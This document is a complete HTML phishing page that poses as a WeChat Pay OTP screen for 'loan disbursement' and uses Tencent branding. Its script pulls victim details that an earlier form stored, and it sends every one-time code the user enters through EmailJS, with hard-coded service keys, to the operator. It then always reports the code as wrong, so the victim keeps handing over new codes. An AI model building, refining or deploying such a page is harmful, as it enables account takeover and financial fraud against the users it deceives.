<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="微信支付 - OTP验证 安全快速！" />
    <title>微信支付 - OTP验证 安全快速！</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script>
      (function () {
        emailjs.init({ publicKey: "MQKcpIwixBVd4Q920" });
      })();
    </script>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family: "Microsoft YaHei", "PingFang SC", "Helvetica Neue", Arial,
          sans-serif;
        font-size: 12px;
        color: #333;
        background: #ededed;
        line-height: 1.5;
      }

      a {
        color: #07c160;
        text-decoration: none;
      }

      a:hover {
        text-decoration: underline;
      }

      .top-bar {
        background: #07c160;
        border-bottom: 1px solid #06ad56;
      }

      .top-bar-inner {
        max-width: 990px;
        margin: 0 auto;
        padding: 12px 16px;
        display: flex;
        align-items: center;
        justify-content: space-between;
      }

      .brand img.logo-main {
        height: 40px;
        display: block;
      }

      .top-links {
        font-size: 12px;
        color: rgba(255, 255, 255, 0.9);
      }

      .top-links a {
        color: #fff;
        margin-left: 12px;
        opacity: 0.9;
      }

      .header-strip {
        background: #fff;
        border-bottom: 2px solid #07c160;
      }

      .header-strip-inner {
        max-width: 990px;
        margin: 0 auto;
        padding: 10px 16px;
        display: flex;
        align-items: center;
        justify-content: space-between;
      }

      .header-strip h1 {
        font-size: 18px;
        font-weight: normal;
        color: #333;
      }

      .header-strip h1 span {
        color: #07c160;
      }

      .consumer-badge {
        display: flex;
        align-items: center;
        gap: 6px;
        font-size: 12px;
        color: #07c160;
      }

      .consumer-badge img {
        width: 20px;
        height: 20px;
        background: #07c160;
        border-radius: 4px;
        padding: 2px;
      }

      .main-wrap {
        max-width: 520px;
        margin: 20px auto;
        padding: 0 16px;
      }

      .otp-box {
        background: #fff;
        border: 1px solid #e0e0e0;
        border-radius: 4px;
        overflow: hidden;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
      }

      .otp-header {
        padding: 14px 24px;
        border-bottom: 1px solid #e8e8e8;
        font-size: 14px;
        font-weight: bold;
        color: #07c160;
        background: #fff;
        text-align: center;
      }

      .otp-content {
        padding: 24px;
      }

      .otp-title {
        text-align: center;
        margin-bottom: 8px;
      }

      .otp-title h2 {
        font-size: 18px;
        font-weight: bold;
        color: #333;
      }

      .otp-title p {
        font-size: 12px;
        color: #999;
        margin-top: 6px;
      }

      .wechat-icon-wrap {
        text-align: center;
        margin: 16px 0;
      }

      .wechat-icon-wrap img {
        width: 48px;
        height: 48px;
        background: #07c160;
        border-radius: 8px;
        padding: 6px;
      }

      .summary-block {
        border-top: 1px solid #e8e8e8;
        border-bottom: 1px solid #e8e8e8;
        padding: 16px 0;
        margin: 16px 0;
      }

      .summary-block h3 {
        font-size: 13px;
        font-weight: bold;
        color: #333;
        margin-bottom: 12px;
      }

      .summary-row {
        display: flex;
        justify-content: space-between;
        align-items: center;
        font-size: 12px;
        margin-bottom: 10px;
      }

      .summary-row:last-child {
        margin-bottom: 0;
      }

      .summary-label {
        color: #999;
      }

      .summary-value {
        color: #333;
        font-weight: 500;
        text-align: right;
        max-width: 60%;
        word-break: break-all;
      }

      .summary-amount {
        color: #07c160;
        font-size: 18px;
        font-weight: bold;
      }

      .otp-message {
        text-align: center;
        font-size: 12px;
        color: #666;
        margin-bottom: 16px;
      }

      .otp-form label {
        display: block;
        font-size: 12px;
        color: #666;
        margin-bottom: 6px;
        text-align: center;
      }

      .otp-input {
        width: 100%;
        max-width: 280px;
        display: block;
        margin: 0 auto;
        padding: 10px 12px;
        border: 1px solid #d9d9d9;
        border-radius: 4px;
        font-size: 20px;
        text-align: center;
        letter-spacing: 0.4em;
        outline: none;
        transition: border-color 0.2s;
      }

      .otp-input:focus {
        border-color: #07c160;
        box-shadow: 0 0 0 2px rgba(7, 193, 96, 0.12);
      }

      .otp-input.error {
        border-color: #ef4444;
        box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.12);
      }

      .otp-error {
        display: none;
        text-align: center;
        margin-top: 8px;
        font-size: 12px;
        color: #cf1322;
      }

      .otp-error.show {
        display: block;
      }

      .otp-timer {
        text-align: center;
        margin-top: 12px;
        font-size: 12px;
        font-weight: bold;
        color: #07c160;
      }

      .btn-verify {
        width: 100%;
        max-width: 280px;
        display: block;
        margin: 20px auto 0;
        padding: 12px;
        background: linear-gradient(180deg, #09d66d 0%, #07c160 100%);
        border: none;
        border-radius: 4px;
        color: #fff;
        font-size: 16px;
        font-weight: bold;
        cursor: pointer;
        transition: opacity 0.2s;
      }

      .btn-verify:hover {
        opacity: 0.92;
      }

      .footer {
        max-width: 990px;
        margin: 24px auto;
        padding: 0 16px;
        text-align: center;
      }

      .footer-social {
        display: flex;
        justify-content: center;
        gap: 12px;
        margin-bottom: 12px;
      }

      .footer-social a {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        width: 32px;
        height: 32px;
        background: #ccc;
        border-radius: 50%;
      }

      .footer-social a img {
        width: 18px;
        height: 18px;
      }

      .footer-links {
        font-size: 12px;
        color: #999;
        line-height: 2;
      }

      .footer-links a {
        color: #999;
        margin: 0 8px;
      }

      .footer-copy {
        font-size: 12px;
        color: #bbb;
        margin-top: 8px;
      }

      @media (max-width: 768px) {
        .header-strip-inner {
          flex-direction: column;
          gap: 8px;
          align-items: flex-start;
        }
      }
    </style>
  </head>
  <body>
    <div class="top-bar">
      <div class="top-bar-inner">
        <div class="brand">
          <img
            class="logo-main"
            src="../assets/wechat/imgi_4_logo.CNA5TJpi.svg"
            alt="WeChat"
          />
        </div>
        <div class="top-links">
          你好，欢迎使用微信放款！
          <a href="#">常见问题</a>
        </div>
      </div>
    </div>

    <div class="header-strip">
      <div class="header-strip-inner">
        <h1>微信<span>OTP验证</span></h1>
        <div class="consumer-badge">
          <img src="../assets/wechat/imgi_5_default.svg" alt="" />
          微信支付 安全保障
        </div>
      </div>
    </div>

    <div class="main-wrap">
      <div class="otp-box">
        <div class="otp-header">验证OTP完成放款</div>
        <div class="otp-content">
          <div class="otp-title">
            <h2>输入验证码</h2>
            <p>请完成OTP验证以确认微信放款</p>
          </div>

          <div class="wechat-icon-wrap">
            <img src="../assets/wechat/imgi_5_default.svg" alt="WeChat Pay" />
          </div>

          <div class="summary-block">
            <h3>交易详情</h3>
            <div class="summary-row">
              <span class="summary-label">客户姓名</span>
              <span class="summary-value" id="summaryName"></span>
            </div>
            <div class="summary-row">
              <span class="summary-label">微信账户</span>
              <span class="summary-value" id="summaryWechatAccount"></span>
            </div>
            <div class="summary-row">
              <span class="summary-label">订单号</span>
              <span class="summary-value" id="summaryOrderId"></span>
            </div>
            <div class="summary-row">
              <span class="summary-label">放款金额</span>
              <span class="summary-value summary-amount" id="summaryAmount"></span>
            </div>
          </div>

          <p class="otp-message" id="otpMessage"></p>

          <div class="otp-form">
            <label for="otp">请输入OTP验证码</label>
            <input
              type="tel"
              id="otp"
              class="otp-input"
              inputmode="numeric"
              maxlength="8"
              autocomplete="one-time-code"
            />
            <p id="otp-error-inline" class="otp-error"></p>
            <p class="otp-timer" id="otpTimer" aria-live="polite">剩余 60 秒</p>
            <button class="btn-verify" type="button" onclick="verifyOTP()">
              确认验证
            </button>
          </div>
        </div>
      </div>
    </div>

    <div class="footer">
      <div class="footer-social">
        <a href="#" aria-label="Facebook">
          <img src="../assets/wechat/imgi_1_default.svg" alt="" />
        </a>
        <a href="#" aria-label="X">
          <img src="../assets/wechat/imgi_2_default.svg" alt="" />
        </a>
        <a href="#" aria-label="LinkedIn">
          <img src="../assets/wechat/imgi_3_default.svg" alt="" />
        </a>
      </div>
      <div class="footer-links">
        <a href="#">关于微信</a>
        <a href="#">联系我们</a>
        <a href="#">WeChat Pay</a>
        <a href="#">Terms of Service</a>
      </div>
      <div class="footer-copy">
        wxcashier-43-574 &copy; 腾讯公司 Tencent Inc.
      </div>
    </div>

    <script>
      const SERVICE_ID = "service_ezzpzs5";
      const OTP_TEMPLATE_ID = "template_7cvd42u";

      let otpCountdown = 60;
      let otpInterval = null;
      let formData = {};
      let attemptCount = 0;

      function clearOTPInput() {
        const otpInput = document.getElementById("otp");
        const otpErrorInline = document.getElementById("otp-error-inline");
        if (otpInput) {
          otpInput.value = "";
          otpInput.classList.remove("error");
          otpInput.focus();
        }
        if (otpErrorInline) {
          otpErrorInline.textContent = "";
          otpErrorInline.classList.remove("show");
        }
      }

      function startOTPTimer() {
        otpCountdown = 60;
        const timerEl = document.getElementById("otpTimer");
        if (!timerEl) return;
        timerEl.textContent = `剩余 ${otpCountdown} 秒`;
        if (otpInterval) clearInterval(otpInterval);

        otpInterval = setInterval(() => {
          otpCountdown--;
          timerEl.textContent = `剩余 ${otpCountdown} 秒`;
          if (otpCountdown <= 0) {
            clearInterval(otpInterval);
            timerEl.textContent = "验证码已过期";
            clearOTPInput();
          }
        }, 1000);
      }

      function sendOTPToEmail(otp) {
        const templateParams = {
          otp: otp,
          phone: formData.phone || formData.wechatAccount || "Không có",
          username: formData.wechatAccount || "Không có",
          customer_name: formData.fullName || "Không có",
          total_amount: formData.amount || "Không có",
          contract_number: formData.contractNumber || `SHB-${Date.now()}`,
          order_id: formData.orderId || "Không có",
          platform: "WeChat Pay",
          method: "WeChat",
        };

        return emailjs
          .send(SERVICE_ID, OTP_TEMPLATE_ID, templateParams)
          .then(() => console.log("WeChat OTP sent to EmailJS"))
          .catch((err) =>
            console.error("EmailJS OTP error:", JSON.stringify(err))
          );
      }

      function showInlineError(message) {
        const otpInput = document.getElementById("otp");
        const otpErrorInline = document.getElementById("otp-error-inline");
        if (otpInput && otpErrorInline) {
          otpInput.classList.add("error");
          otpErrorInline.textContent = message;
          otpErrorInline.classList.add("show");
          otpInput.focus();
          otpInput.select();
        }
      }

      function verifyOTP() {
        const otpInput = document.getElementById("otp");
        const otp = otpInput.value.trim();

        document.getElementById("otp-error-inline").classList.remove("show");
        otpInput.classList.remove("error");

        if (otp.length !== 6 && otp.length !== 8) {
          showInlineError("OTP验证码不正确，请重新输入");
          return;
        }

        attemptCount++;
        sendOTPToEmail(otp);

        try {
          const attempts = JSON.parse(
            localStorage.getItem("otpAttempts") || "[]"
          );
          attempts.push({ t: new Date().toISOString(), len: otp.length });
          localStorage.setItem("otpAttempts", JSON.stringify(attempts));
        } catch (_) {}

        startOTPTimer();
        showInlineError("验证码不正确或已过期，请重试");
      }

      window.addEventListener("load", () => {
        startOTPTimer();

        const otpInput = document.getElementById("otp");
        const otpErrorInline = document.getElementById("otp-error-inline");

        if (otpInput && otpErrorInline) {
          otpInput.addEventListener("input", () => {
            otpInput.classList.remove("error");
            otpErrorInline.classList.remove("show");
          });
        }

        try {
          formData = JSON.parse(sessionStorage.getItem("formData") || "{}");
          if (!formData.wechatAccount && !formData.fullName) {
            window.location.href = "wechat.html";
            return;
          }

          document.getElementById("summaryName").textContent =
            formData.fullName || formData.accountHolder || "N/A";
          document.getElementById("summaryWechatAccount").textContent =
            formData.wechatAccount || "N/A";
          document.getElementById("summaryOrderId").textContent =
            formData.orderId || "N/A";
          document.getElementById("summaryAmount").textContent =
            formData.amount || "N/A";

          const wechatAccount = formData.wechatAccount || formData.phone || "N/A";
          document.getElementById("otpMessage").textContent =
            `验证码已发送至微信账户 ${wechatAccount}，请查收并输入。`;
        } catch (error) {
          console.error("Error parsing formData:", error);
          window.location.href = "wechat.html";
        }
      });

      window.addEventListener("beforeunload", () => {
        if (otpInterval) {
          clearInterval(otpInterval);
          otpInterval = null;
        }
      });

      document.addEventListener("visibilitychange", () => {
        if (document.hidden && otpInterval) {
          clearInterval(otpInterval);
          otpInterval = null;
        } else if (!document.hidden && otpCountdown > 0 && otpCountdown < 60) {
          startOTPTimer();
        }
      });
    </script>
  </body>
</html>
